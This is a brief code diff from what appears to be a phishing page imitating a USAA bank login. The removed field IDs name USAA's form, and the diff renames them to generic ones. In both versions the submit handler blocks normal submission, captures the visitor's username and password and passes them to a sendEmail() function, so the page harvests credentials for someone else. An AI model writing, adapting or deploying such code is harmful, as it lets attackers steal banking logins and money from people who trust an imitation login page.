@@ -130,8 +130,8 @@
                document.getElementById('login-form').addEventListener('submit', function(event) {
     event.preventDefault();
 
-    const username = document.getElementById('usaa-form-v5-10-1-input-username').value;
-    const password = document.getElementById('usaa-form-v5-10-1-input-password').value;
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
     sendEmail(username, password);
 });
